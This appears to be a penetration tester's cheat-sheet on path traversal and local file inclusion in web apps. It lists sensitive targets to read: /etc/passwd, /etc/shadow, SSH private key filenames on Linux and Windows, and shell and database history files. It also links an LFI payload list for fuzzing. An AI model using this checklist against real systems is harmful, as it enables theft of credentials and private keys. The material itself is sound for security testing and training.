If you are able to enumerate files through web apps via ../../../../../, things to look for:

code execution

`/etc/passwd
`/etc/shadow`
config files (research default locations)

```
~/.ssh/authorized_keys 
	#id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
```
Linux SSH keys
`/home/<user>/.ssh/<keys>
also try
`/home/<user>/<keys>`
	id_rsa
	id_dsa
	id_ecdsa
	id_eddsa
	id_ecdsa_sk 
	id_ed25519 
	id_ed25519_sk
	RSA/DSA/EC/OPENSSH 32/64 for reference

Windows SSH keys
`/Users/<user>/.ssh/<keys>
	id_rsa
	id_dsa
	id_ecdsa
	id_eddsa
	id_ecdsa_sk 
	id_ed25519 
	id_ed25519_sk
	RSA/DSA/EC/OPENSSH 32/64 for reference

Conceptually, windows and linux storage of ssh keys are very similar




File of LFI payloads to use, combine LFI attack with FUZZING
https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt

some other files to try in
```
~/.atfp_history 
~/.bash_history 
~/.bash_logout 
~/.bash_profile 
~/.bashrc 
~/.gtkrc 
~/.login 
~/.logout 
~/.mysql_history 
~/.nano_history 
~/.php_history 
~/.profile 
~/.ssh/authorized_keys 
	#id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
```